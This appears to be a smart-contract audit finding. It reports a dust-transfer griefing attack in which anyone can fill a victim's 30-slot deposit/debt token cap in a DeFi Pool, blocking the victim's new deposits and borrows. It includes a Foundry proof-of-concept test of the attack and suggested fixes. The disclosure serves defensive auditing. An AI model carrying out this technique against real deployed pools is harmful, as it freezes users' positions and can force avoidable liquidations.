### Title
Attacker can brick a victim's collateral/debt-token slots via dust transfers, blocking new deposits and borrows - ([File: contracts/Pool.sol](contracts/Pool.sol))

### Summary
`Pool` caps the number of deposit + debt tokens an account may hold at `MAX_TOKENS_PER_USER = 30`. Because `DepositToken._transfer` (and `_mint` via `deposit(amount_, onBehalfOf_)`) unconditionally registers the recipient's token in the pool's per-account set whenever the recipient's prior balance is zero, any EOA can push dust amounts of every registered `DepositToken` to a victim until the combined deposit+debt set hits 30. Once full, every subsequent first-time receipt — a deposit of a new collateral type to the victim, a `deposit` `onBehalfOf_` the victim, or the first `DebtToken.issue`/`leverage` of a new synthetic — reverts with `UserReachedMaxTokens`. This is the on-chain analog of connection-slot exhaustion DoS: the attacker occupies all of a bounded per-victim resource with near-zero cost. [1](#0-0) [2](#0-1) [3](#0-2) 

### Finding Description
- `Pool.addToDepositTokensOfAccount` and `addToDebtTokensOfAccount` are gated by `onlyIfAdditionWillNotReachMaxTokens`, which reverts once `debtTokensOfAccount.length + depositTokensOfAccount.length >= 30` for the account. [4](#0-3) 
- `DepositToken._transfer` calls `pool.addToDepositTokensOfAccount(recipient_)` whenever `_recipientBalanceBefore == 0 && amount_ > 0`, with no consent check on the recipient. [5](#0-4) 
- `DepositToken.transfer`/`transferFrom` only check that the *sender's* amount is unlocked via `_revertIfLocked(sender_)`; nothing protects the recipient. [6](#0-5) 
- `DepositToken.deposit(amount_, onBehalfOf_)` mints to an arbitrary beneficiary, so the attacker doesn't even need to hold transferable balances — one dust deposit per collateral type with `onBehalfOf_ = victim` fills a slot. [7](#0-6) 
- `DebtToken` issuance similarly registers the debtor through `addToDebtTokensOfAccount`, so a victim whose set is saturated cannot issue a *new* synthetic asset, and cannot receive a *new* collateral type to improve an unhealthy position. [8](#0-7) 
- The invariant broken is per-account liveness: the hard cap intended as a gas bound on `debtOf`/`depositOf` loops is exhaustible by a third party.

### Impact Explanation
Temporary freezing of funds / blocked protocol operations for the victim. While saturated, the victim cannot (a) deposit any collateral type they don't already hold — including a rescue deposit to recover an unhealthy position, which can force an otherwise-avoidable liquidation; (b) issue any new synthetic debt token (`issue`, `leverage`, `flashIssue` revert in `addToDebtTokensOfAccount`); (c) receive any deposit token they don't already hold (transfers and `onBehalfOf_` deposits revert). Recovery requires the victim to spend gas transferring each dust balance out to zero (which calls `removeFromDepositTokensOfAccount`), and the attacker can re-fill slots as they are freed, sustaining the DoS. Like the reference incident, no funds are stolen directly, but the victim's position is unusable for the attack duration. [9](#0-8) 

### Likelihood Explanation
- Fully unprivileged: attacker needs only dust of each collateral's underlying (or already-held `msdTOKEN` balances) plus gas; cost is roughly `N` cheap `deposit`/`transfer` calls where N is the number of remaining free slots.
- Reachability depends on the deployed pool having enough registered `DepositToken`s (combined with the victim's existing tokens) to reach 30. On pools where `depositTokens.length + debtTokens.length < 30` minus victim's current count, the attack cannot fully saturate the set, which caps severity to Medium. No modifier (`whenNotPaused`, `nonReentrant`, `onlyIfDepositTokenExists`) prevents it, and there is no opt-out or minimum-amount threshold. [10](#0-9) 

### Recommendation
- Only grow `depositTokensOfAccount`/`debtTokensOfAccount` on state-changing actions initiated by the account itself (`deposit` where `onBehalfOf_ == _msgSender()`, `issue`), or treat unsolicited `transfer`/`onBehalfOf_` receipts as non-registering.
- Alternatively, exempt `addToDepositTokensOfAccount` from the cap when triggered by `_transfer`/`seize`, or make removals cheap and let the cap apply only to debt positions.
- A pragmatic mitigation: enforce a minimum meaningful first-deposit amount, or allow `debtPositionOf`/`depositOf` to iterate a bounded subset so the cap can be raised/removed.

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// Hardhat/Foundry fork test against a deployed Pool with >= N registered DepositTokens.
// Assumes: pool has D deposit tokens; victim currently holds K tokens total (deposit+debt).

function test_dustGriefingFillsVictimTokenSet() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    address[] memory depositTokens = pool.getDepositTokens();

    // Attacker fills victim's free slots: for each deposit token the victim doesn't hold,
    // deposit 1 wei of underlying on behalf of the victim.
    for (uint256 i; i < depositTokens.length; ++i) {
        IDepositToken dt = IDepositToken(depositTokens[i]);
        if (dt.balanceOf(victim) > 0) continue;

        IERC20 underlying = dt.underlying();
        deal(address(underlying), attacker, 1);
        vm.startPrank(attacker);
        underlying.approve(address(dt), 1);
        dt.deposit(1, victim); // _mint -> pool.addToDepositTokensOfAccount(victim)
        vm.stopPrank();
    }

    // Victim's combined set is now at MAX_TOKENS_PER_USER (assuming enough registered tokens).
    assertEq(
        pool.getDepositTokensOfAccount(victim).length + pool.getDebtTokensOfAccount(victim).length,
        pool.MAX_TOKENS_PER_USER()
    );

    // 1) A new collateral type deposited to the victim reverts.
    IDepositToken newDt = IDepositToken(newlyAddedDepositToken); // token not in victim's set
    IERC20 newUnderlying = newDt.underlying();
    deal(address(newUnderlying), attacker, 1e18);
    vm.startPrank(attacker);
    newUnderlying.approve(address(newDt), 1);
    vm.expectRevert(Pool.UserReachedMaxTokens.selector);
    newDt.deposit(1, victim);
    vm.stopPrank();

    // 2) Victim cannot issue a synthetic whose debt token isn't already in their set.
    IDebtToken newDebt = pool.debtTokenOf(ISyntheticToken(newSyntheticToken));
    vm.prank(victim);
    vm.expectRevert(Pool.UserReachedMaxTokens.selector);
    newDebt.issue(1e18, victim);

    // 3) Victim self-recovers only by spending gas to zero out each dust balance.
    vm.startPrank(victim);
    IDepositToken(depositTokens[0]).transfer(attacker, 1); // balance -> 0 -> removeFromDepositTokensOfAccount
    vm.stopPrank();
}
```

Note: full saturation requires `depositTokens.length + debtTokens.length ≥ 30` on the target pool (or a victim already holding enough tokens). On smaller deployed pools the attack still blocks all *new* token types beyond the remaining free slots, proportionally reducing impact.
